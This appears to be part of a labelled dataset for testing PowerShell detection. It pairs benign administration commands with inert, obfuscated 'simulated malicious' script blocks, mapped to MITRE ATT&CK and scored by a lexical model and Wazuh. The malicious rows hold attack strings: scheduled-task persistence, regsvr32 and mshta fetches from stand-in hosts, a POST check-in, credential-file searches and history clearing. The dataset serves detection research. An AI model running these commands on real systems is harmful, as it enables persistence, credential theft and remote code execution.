id,label,truth,class_id,dataset_group,scenario,behavior_family,evaluation_group,source_family,tactic,technique,mitre_attack_id,obfuscation_type,safety_class,lexical_input_source,scriptblock_event_id,scriptblock_event_sha256,analysis_text,lexical_score,lexical_reasons,wazuh_prediction,wazuh_alert_count,wazuh_rule_ids,wazuh_rule_levels,wazuh_max_rule_level,wazuh_rule_descriptions,feature_analysis_length,feature_line_count,feature_token_count,feature_special_char_count,feature_special_char_ratio,feature_digit_ratio,feature_whitespace_ratio,feature_entropy,feature_quoted_literal_count,feature_short_literal_count,feature_joined_literal_length,feature_base64_candidate_count,feature_longest_base64_candidate,feature_decoded_view_count,feature_backtick_count,feature_concat_operator_count,feature_join_operator_count,feature_format_operator_count,feature_char_cast_count,feature_suspicious_mixed_case_count,feature_suspicious_mixed_case_tokens,feature_execution_hit_count,feature_execution_hits,feature_raw_execution_hit_count,feature_recovered_execution_hit_count,feature_decoded_execution_hit_count,feature_download_hit_count,feature_download_hits,feature_raw_download_hit_count,feature_recovered_download_hit_count,feature_decoded_download_hit_count,feature_network_c2_hit_count,feature_network_c2_hits,feature_raw_network_c2_hit_count,feature_recovered_network_c2_hit_count,feature_decoded_network_c2_hit_count,feature_defense_evasion_hit_count,feature_defense_evasion_hits,feature_raw_defense_evasion_hit_count,feature_recovered_defense_evasion_hit_count,feature_decoded_defense_evasion_hit_count,feature_persistence_hit_count,feature_persistence_hits,feature_raw_persistence_hit_count,feature_recovered_persistence_hit_count,feature_decoded_persistence_hit_count,feature_credential_access_hit_count,feature_credential_access_hits,feature_raw_credential_access_hit_count,feature_recovered_credential_access_hit_count,feature_decoded_credential_access_hit_count,feature_lolbin_hit_count,feature_lolbin_hits,feature_raw_lolbin_hit_count,feature_recovered_lolbin_hit_count,feature_decoded_lolbin_hit_count,feature_collection_hit_count,feature_collection_hits,feature_raw_collection_hit_count,feature_recovered_collection_hit_count,feature_decoded_collection_hit_count,feature_remote_execution_hit_count,feature_remote_execution_hits,feature_raw_remote_execution_hit_count,feature_recovered_remote_execution_hit_count,feature_decoded_remote_execution_hit_count,feature_discovery_hit_count,feature_discovery_hits,feature_raw_discovery_hit_count,feature_recovered_discovery_hit_count,feature_decoded_discovery_hit_count,feature_indicator_category_count,feature_high_risk_category_count,feature_raw_indicator_hit_count,feature_indicator_hit_count,feature_recovered_indicator_hit_count,feature_decoded_indicator_hit_count,cv_fold,cv_threshold,lexical_prediction,deployment_threshold,lexical_prediction_full_fit,hybrid_or_prediction,hybrid_and_prediction,wazuh_level_3_prediction,wazuh_level_4_prediction,wazuh_level_5_prediction,wazuh_level_7_prediction,wazuh_level_10_prediction,wazuh_level_12_prediction
PST-245,simulated_malicious,1,1,obfuscated_indicator,scheduled_task_persistence_combined_obfuscation,scheduled_task_persistence,positive:scheduled_task_persistence,Source-derived inert offensive behavior pattern,Persistence,Scheduled Task/Job: Scheduled Task,T1053.005,combined_obfuscation,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,a5895818-95ba-4d72-95e8-9a193d1f5c30,2ec82b91b4d39d86e700602d4daed0111ba134331c5aaae84f03f81411bbf0c2,"$parts=@('regIsT`ER-SChEdu','LEDTaSK -ta`SKNAme ''','UPDaTECHeCk'' -act`I','oN (NEw-scHedUleDTaSKa','C`T`IOn -eX`eCuTe',' ''pOwe`rsHELl.exe'' -','ARg`uMeNT ''-nO`PrOFILE ','-enCOdeD`CO`mManD vWB','`YaGK`aDABlAC0atWB1','AHQa`CaB1AHQAiAa','naFqaSAbFaf`mA`SqBTAc0aS','qBoa`EuAuGbuaC`cA''',')'); $indicator=($parts -join ''); Write-Output $indicator",13,+2:category_execution;+2:category_persistence;+2:multiple_high_risk_categories;+2:indicator_recovered_from_fragmentation;+1:backtick_obfuscation;+1:string_reconstruction;+1:irregular_case;+2:combined_obfuscation,0,0,,,0,,345,1,42,96,0.278261,0.011594,0.043478,5.311818,14,3,236,0,0,0,18,0,1,0,0,7,CaB1AHQAiAa;EuAuGbuaC;NEw-scHedUleDTaSKa;SqBTAc0aS;UPDaTECHeCk;aDABlAC0atWB1;naFqaSAbFaf,1,encodedcommand,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,new-scheduledtaskaction;register-scheduledtask,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,3,2,0,1,5,1,5,1,1,0,0,0,0,0,0,0
PST-246,benign,0,0,normal_benign,command_lookup_normal_v2,command_lookup_normal,benign:command_lookup_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,f3a9bc31-6cb3-487c-b252-72a55d8499a1,a3a33ba558253c4d5fe1025805307aefd918fc5bc41c051fa1c2d3075814e3f1,"Get-Command Get-Process | Select-Object Name, CommandType, Source; Write-Output 'benign variant 2'",3,+2:category_execution;+1:category_discovery,1,1,91815,4,4,Powershell executing process discovery,98,1,10,10,0.102041,0.010204,0.102041,4.659488,1,1,16,0,0,0,0,0,0,0,0,0,,1,get-command,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,2,1,2,2,0,0,1,5,0,5,0,1,0,1,1,0,0,0,0
PST-247,simulated_malicious,1,1,obfuscated_indicator,add_type_native_api_partial_combined_obfuscation,add_type_native_api_partial,positive:add_type_native_api_partial,Source-derived inert offensive behavior pattern,Execution,Native API,T1106,combined_obfuscation,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,dbce3401-72c6-45dd-bafe-830b4347b64a,84f99aa7cbdf6d38dfdf45bfa8a3cc25059eb435cb8c0215844c0e48ecd9c7ff,"$parts=@('Add-tYPE -MeMbe`Rd','`EFINiTion ''[DLLim`','PorT(""keRNeL32','.DlL"")] puBl','IC STa`tIc EXtERN',' in`TptR OpENprO','C`esS(uINT aCcE','sS, bool InhEr`it, ','Int pr`OCesSi','d);'' -nAme NAt`i','VemEt`hods -NA`','mEsPACE ThESIs.inEr','t'); $indicator=($parts -join ''); Write-Output $indicator",8,+2:category_defense_evasion;+1:backtick_obfuscation;+1:string_reconstruction;+1:fragmented_literals;+1:irregular_case;+2:combined_obfuscation,0,0,,,0,,299,1,43,87,0.29097,0.006689,0.070234,5.182102,14,8,194,0,0,0,11,0,1,0,0,2,OpENprO;ThESIs.inEr,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,add-type,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0,4,6,1,5,1,1,0,0,0,0,0,0,0
PST-248,simulated_malicious,1,1,obfuscated_indicator,process_discovery_mixed_case,process_discovery,positive:process_discovery,Source-derived inert offensive behavior pattern,Discovery,Process Discovery,T1057,mixed_case,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,7306863d-e4ca-42c8-88b0-dbb0ce7e632b,e40f66572933088d9075160dcf949acd89a8a6506d1e5231cb6f98e4df471ba5,"$indicator='GeT-PRoCESs | selEcT-oBjECt nAme,Id,pATH'; Write-Output $indicator",2,+1:category_discovery;+1:irregular_case,1,1,91815,4,4,Powershell executing process discovery,78,1,8,12,0.153846,0.0,0.064103,4.926258,1,0,40,0,0,0,0,0,0,0,0,2,GeT-PRoCESs;selEcT-oBjECt,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0,1,5,0,5,0,1,0,1,1,0,0,0,0
PST-249,benign,0,0,normal_benign,net_ip_config_normal_v2,net_ip_config_normal,benign:net_ip_config_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,2b512f82-2ddf-4216-ac4d-da861e15268b,f1ff0606523884b0e9f96403c19452d3ca20117278a732c5c6293cf2dc49ea79,"Get-NetIPConfiguration | Select-Object -First 3 InterfaceAlias, IPv4Address; Write-Output 'benign variant 2'",0,,0,0,,,0,,108,1,10,9,0.083333,0.027778,0.092593,4.726761,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,0,4,0,5,0,0,0,0,0,0,0,0,0
PST-250,simulated_malicious,1,1,clear_indicator,regsvr32_proxy_execution_clear,regsvr32_proxy_execution,positive:regsvr32_proxy_execution,Source-derived inert offensive behavior pattern,Defense Evasion,Regsvr32,T1218.010,none,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,0f5dccd9-3683-4050-81e4-24bed357738f,77a969ae0f2da3b81ced205b346d80514ed1dcea4636034a83d2215fa4ffab23,$indicator='regsvr32.exe /s /n /u /i:https://reg.example.invalid/a.sct scrobj.dll'; Write-Output $indicator,2,+2:category_lolbin,0,0,,,0,,107,1,12,21,0.196262,0.018692,0.065421,4.6882,1,0,69,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,regsvr32,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0,2,3,0,5,0,0,0,0,0,0,0,0,0
PST-251,simulated_malicious,1,1,obfuscated_indicator,powershell_history_clear_base64_literal_decode_safe,powershell_history_clear,positive:powershell_history_clear,Source-derived inert offensive behavior pattern,Defense Evasion,Clear Command History,T1070.003,base64_literal_decode_safe,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,cdce393f-0cc0-4412-83cf-310da9ddf7fb,e89a57dee3426670b8cbbea6295d04776e26192fdf139ec5040b276cb8e488d5,$encoded='QwBsAGUAYQByAC0ASABpAHMAdABvAHIAeQA7ACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAAKABHAGUAdAAtAFAAUwBSAGUAYQBkAEwAaQBuAGUATwBwAHQAaQBvAG4AKQAuAEgAaQBzAHQAbwByAHkAUwBhAHYAZQBQAGEAdABoACAALQBGAG8AcgBjAGUA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator,6,+2:category_defense_evasion;+1:base64_candidate;+1:irregular_case;+2:combined_obfuscation,1,1,91809,10,10,Powershell script may be using Base64 decoding method,314,1,10,25,0.079618,0.025478,0.009554,5.025953,1,0,192,1,192,1,0,0,0,0,0,2,FromBase64String;QwBsAGUAYQByAC0ASABpAHMAdABvAHIAeQA7ACAAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAAKABHAGUAdAAtAFAAUwBSAGUAYQBkAEwAaQBuAGUATwBwAHQAaQBvAG4AKQAuAEgAaQBzAHQAbwByAHkAUwBhAHYAZQBQAGEAdABoACAALQBGAG8AcgBjAGUA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0,4,6,1,5,1,1,1,1,1,1,1,1,0
PST-252,benign,0,0,hard_benign,hard_base64_inventory_note_v2,hard_base64_inventory_note,benign:hard_base64_inventory_note,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,169c867d-217d-41dd-a755-71bd05ef1aa8,df9e031e7300ecfe41e6efd26cbf87fb07fc714a237d85bc43591570f8e0b783,$b = 'aW52ZW50b3J5LW5vdGU='; [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); Write-Output 'hard benign variant 2',3,+2:category_defense_evasion;+1:irregular_case,1,1,91809,10,10,Powershell script may be using Base64 decoding method,131,1,12,25,0.19084,0.083969,0.061069,5.269494,2,0,41,0,0,0,0,0,0,0,0,2,FromBase64String;aW52ZW50b3J5LW5vdGU,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0,2,3,1,5,0,1,1,1,1,1,1,1,0
PST-253,simulated_malicious,1,1,obfuscated_indicator,mshta_proxy_execution_base64_literal_decode_safe,mshta_proxy_execution,positive:mshta_proxy_execution,Source-derived inert offensive behavior pattern,Defense Evasion,Mshta,T1218.005,base64_literal_decode_safe,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,d10ffae6-571d-4d17-8df0-9914fbae822f,c856b74775cee25fe6e876c38ef5d56767d529f2330966b4452cdc128ccfaadf,$encoded='bQBzAGgAdABhAC4AZQB4AGUAIABqAGEAdgBhAHMAYwByAGkAcAB0ADoAYQA9AEcAZQB0AE8AYgBqAGUAYwB0ACgAJwBzAGMAcgBpAHAAdAA6AGgAdAB0AHAAcwA6AC8ALwBoAHQAYQAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AYQAuAHMAYwB0ACcAKQAuAEUAeABlAGMAKAApADsAYwBsAG8AcwBlACgAKQA='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator,14,+2:category_defense_evasion;+2:category_lolbin;+2:multiple_high_risk_categories;+2:indicator_recovered_from_base64;+2:indicator_recovered_from_fragmentation;+1:base64_candidate;+1:irregular_case;+2:combined_obfuscation,1,1,91809,10,10,Powershell script may be using Base64 decoding method,366,1,10,26,0.071038,0.04918,0.008197,4.993846,1,0,244,1,244,1,0,0,0,0,0,2,FromBase64String;bQBzAGgAdABhAC4AZQB4AGUAIABqAGEAdgBhAHMAYwByAGkAcAB0ADoAYQA9AEcAZQB0AE8AYgBqAGUAYwB0ACgAJwBzAGMAcgBpAHAAdAA6AGgAdAB0AHAAcwA6AC8ALwBoAHQAYQAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AYQAuAHMAYwB0ACcAKQAuAEUAeABlAGMAKAApADsAYwBsAG8AcwBlACgAKQA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,1,mshta,0,1,1,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,2,1,1,0,4,1,5,1,1,1,1,1,1,1,1,0
PST-254,benign,0,0,normal_benign,env_summary_normal_v2,env_summary_normal,benign:env_summary_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,cce11f62-f3cd-45b2-89d4-e68bad374c81,97f14cabbc5cb2811a11877b614eededb0bad898c0c6a33095af75c6324557ec,"Get-ChildItem Env: | Select-Object -First 6 Name, Value; Write-Output 'benign variant 2'",2,+1:category_discovery;+1:irregular_case,1,1,91819,4,4,Powershell script searching filesystem,88,1,11,10,0.113636,0.022727,0.125,4.675492,1,1,16,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0,2,3,0,5,0,1,0,1,1,0,0,0,0
PST-255,benign,0,0,normal_benign,acl_read_normal_v1,acl_read_normal,benign:acl_read_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,f7d036d1-ab9d-46b0-a2ec-96d4746295c8,f04b916fc4196b1c80ebd37b0c7e74149eaa2dd01b4c92c8d7ce84075741c7d9,"Get-Acl -Path $env:TEMP | Select-Object Owner, AccessToString",1,+1:irregular_case,1,1,91816,4,4,Powershell script querying system environment variables,61,1,7,7,0.114754,0.0,0.098361,4.555486,0,0,0,0,0,0,0,0,0,0,0,1,AccessToString,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,2,3,0,5,0,1,0,1,1,0,0,0,0
PST-256,benign,0,0,normal_benign,tcp_connection_normal_v1,tcp_connection_normal,benign:tcp_connection_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,07756219-1a1b-44ed-a170-a43fd6ff3481,eb62f96f66b1b5dc3eba4e0fd41a36bdbbd75f357565a48ede7aacd813a2105f,"Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Select-Object -First 5 LocalAddress, RemoteAddress, State",0,,0,0,,,0,,129,1,11,8,0.062016,0.007752,0.085271,4.505934,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,1,5,0,5,0,0,0,0,0,0,0,0,0
PST-257,simulated_malicious,1,1,obfuscated_indicator,mshta_proxy_execution_combined_obfuscation,mshta_proxy_execution,positive:mshta_proxy_execution,Source-derived inert offensive behavior pattern,Defense Evasion,Mshta,T1218.005,combined_obfuscation,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,7ee19e30-e3e8-4c3d-ab6b-7214d614159c,7e9dd15548897a5664f6757f8e071b8a8a2768604b6ad8f9bb55fb32eba13960,"$parts=@('mSHTa.eXe j','avasCr','iPt:A=GeT','`OBJeCt(','''SCRi`P','T:HTtpS:/','/htA.exAMp','`le.InVAl','iD/A.SCt'').','eXEC();','cloSE()'); $indicator=($parts -join ''); Write-Output $indicator",8,+2:category_lolbin;+1:backtick_obfuscation;+1:string_reconstruction;+1:fragmented_literals;+1:irregular_case;+2:combined_obfuscation,0,0,,,0,,193,1,24,75,0.388601,0.0,0.031088,5.088044,12,11,94,0,0,0,3,0,1,0,0,3,htA.exAMp;le.InVAl;mSHTa.eXe,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,mshta,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0,0,4,1,5,1,1,0,0,0,0,0,0,0
PST-258,benign,0,0,hard_benign,hard_csv_processing_v2,hard_csv_processing,benign:hard_csv_processing,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,d754b8dc-f9a2-4fec-9bbf-0644e7a3ae13,ad91396fe2a0ec228f7162a7214ca81270e96b753ebc7fa5980d15ed8ced765a,"$csv = 'name,status`nsvc1,running`nsvc2,stopped'; $csv | ConvertFrom-Csv | Select-Object name, status; Write-Output 'hard benign variant 2'",4,+1:backtick_obfuscation;+1:irregular_case;+2:combined_obfuscation,0,0,,,0,,139,1,17,20,0.143885,0.021583,0.100719,4.665153,2,0,60,0,0,0,2,0,0,0,0,1,ConvertFrom-Csv,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,0,4,1,5,0,1,0,0,0,0,0,0,0
PST-259,benign,0,0,hard_benign,hard_wmi_inventory_filter_v2,hard_wmi_inventory_filter,benign:hard_wmi_inventory_filter,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,777f38e1-2f11-43b1-94f9-4102447bafbf,deb3267d10e7d9386ddb59ec898fb9e5d822192b4dffd46b778c35119dd603e6,"Get-CimInstance Win32_Process | Where-Object Name -like '*host*' | Select-Object -First 5 Name, ProcessId; Write-Output 'hard benign variant 2'",2,+1:category_discovery;+1:irregular_case,0,0,,,0,,143,1,16,17,0.118881,0.027972,0.118881,4.756607,2,1,27,0,0,0,0,0,0,0,0,1,Get-CimInstance,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,win32_process,1,0,0,1,0,1,1,0,0,4,6,0,5,0,0,0,0,0,0,0,0,0
PST-260,benign,0,0,normal_benign,firewall_profile_read_normal_v2,firewall_profile_read_normal,benign:firewall_profile_read_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,b671235a-bbd0-4d9b-83e9-ed17882d10ab,5cfeed1ff5f0d5ea873a8d15acde9c68b9bc3b81f7070d088257ce2f63a6fe5d,"Get-NetFirewallProfile | Select-Object Name, Enabled; Write-Output 'benign variant 2'",1,+1:irregular_case,0,0,,,0,,85,1,8,8,0.094118,0.011765,0.094118,4.56948,1,1,16,0,0,0,0,0,0,0,0,1,Get-NetFirewallProfile,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,2,3,0,5,0,0,0,0,0,0,0,0,0
PST-261,benign,0,0,normal_benign,module_list_normal_v1,module_list_normal,benign:module_list_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,5d6701f4-dd21-4619-986f-ec5ad62c7e04,8a9468ad41499e2ce909df87130611d58b23c1e53e1c5a0cd93937cb463446c9,"Get-Module -ListAvailable | Select-Object -First 5 Name, Version",0,,0,0,,,0,,64,1,7,6,0.09375,0.015625,0.109375,4.487955,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,1,5,0,5,0,0,0,0,0,0,0,0,0
PST-262,simulated_malicious,1,1,obfuscated_indicator,invoke_restmethod_post_combined_obfuscation,invoke_restmethod_post,positive:invoke_restmethod_post,Source-derived inert offensive behavior pattern,Exfiltration,Exfiltration Over C2 Channel,T1041,combined_obfuscation,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,81991c6d-a367-42be-8803-02c1d3bf5a9f,2cd75f41345502e2dd0590f8638fa639a7c8b030f5c4f27881e4607d0e0c4fcc,"$parts=@('invO`Ke','-REs`TmetHod ','-MeT`HoD pO','sT -Uri ''','httPS://API.','ex`amPlE.iN','V`AlId/Ch`EcKi','N'' -bOdY',' @{hosT=''wS-','01'';uSEr=''','AnA`LYSt'';stat','US=''o','K''}'); $indicator=($parts -join ''); Write-Output $indicator",14,+2:category_download;+2:category_network_c2;+2:multiple_high_risk_categories;+2:indicator_recovered_from_fragmentation;+1:backtick_obfuscation;+1:string_reconstruction;+1:fragmented_literals;+1:irregular_case;+2:combined_obfuscation,0,0,,,0,,240,1,35,97,0.404167,0.008333,0.045833,5.086823,14,13,129,0,0,0,7,0,1,0,0,1,amPlE.iN,0,,0,0,0,1,invoke-restmethod,0,1,0,1,checkin,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,0,2,2,0,0,4,1,5,1,1,0,0,0,0,0,0,0
PST-263,benign,0,0,normal_benign,bios_inventory_normal_v1,bios_inventory_normal,benign:bios_inventory_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,1acbd15d-3610-4b00-a3bb-328eedb71f7b,435cf7b03abbeb45762be5f08e9d1d15c821a24434461d7310e5b880856a6dd6,"Get-CimInstance Win32_BIOS | Select-Object Manufacturer, SerialNumber",2,+1:category_discovery;+1:irregular_case,0,0,,,0,,69,1,5,5,0.072464,0.028986,0.072464,4.579772,0,0,0,0,0,0,0,0,0,0,0,1,Get-CimInstance,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,win32_bios,1,0,0,1,0,1,1,0,0,3,4,0,5,0,0,0,0,0,0,0,0,0
PST-264,benign,0,0,hard_benign,hard_concat_report_name_v1,hard_concat_report_name,benign:hard_concat_report_name,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,d5ca43ac-af77-49cf-86e8-8f8749567075,317a5c0461ac86e642b273988452fd23d72dc4b6bdca38d0ac3aae38e848feb1,$name = ('weekly' + '-' + 'inventory' + '-' + 'report' + '-' + $env:COMPUTERNAME); Write-Output $name,5,+1:category_remote_execution;+1:string_reconstruction;+1:fragmented_literals;+2:combined_obfuscation,1,1,91816,4,4,Powershell script querying system environment variables,101,1,11,30,0.29703,0.0,0.158416,4.554216,6,6,24,0,0,0,0,6,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,computername,1,0,0,0,,0,0,0,1,1,1,1,0,0,2,3,1,5,1,1,1,1,1,0,0,0,0
PST-265,benign,0,0,normal_benign,date_check_normal_v2,date_check_normal,benign:date_check_normal,Microsoft PowerShell administrative examples,Benign Administration,Legitimate PowerShell administration,N/A,none,benign_safe_execution,windows_event_4104_scriptblocktext,62c8e103-1f5d-4e66-95d3-b4cf7743b2a0,d791ce8950f0eeaa510bca2b7b4d025a90e1594f2623ed714d8dd27e314bf25f,Get-Date | Select-Object DateTime; Write-Output 'benign variant 2',0,,0,0,,,0,,66,1,7,7,0.106061,0.015152,0.106061,4.283486,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0,3,4,0,5,0,0,0,0,0,0,0,0,0
PST-266,simulated_malicious,1,1,obfuscated_indicator,credential_file_search_combined_obfuscation,credential_file_search,positive:credential_file_search,Source-derived inert offensive behavior pattern,Credential Access,Credentials In Files,T1552.001,combined_obfuscation,simulated_malicious_non_executable,windows_event_4104_scriptblocktext,1bef3a25-8ca0-45e9-87e9-baed5395dada,f82394cffb796e1e0533ad2eeaf85d4ca8691453cc7c2c4e27d0cf12de4e23c1,"$parts=@('geT-cHildiT','`em -patH',' ''C:\uSers'' -','ReC`urSE',' -inCLuDE',' ''*.COnf`I','G'',''*.xml'' ','| seleCt-','sTRIng ','-pa`ttErn',' ''PaSSWOrd|toKE','N|Se`cr','ET'''); $indicator=($parts -join ''); Write-Output $indicator",11,+2:category_credential_access;+1:category_discovery;+2:indicator_recovered_from_fragmentation;+1:backtick_obfuscation;+1:string_reconstruction;+1:fragmented_literals;+1:irregular_case;+2:combined_obfuscation,0,0,,,0,,232,1,29,92,0.396552,0.0,0.060345,4.869934,14,13,121,0,0,0,5,0,1,0,0,1,geT-cHildiT,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,password;select-string,1,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,0,1,0,2,1,1,3,2,0,1,5,1,5,1,1,0,0,0,0,0,0,0
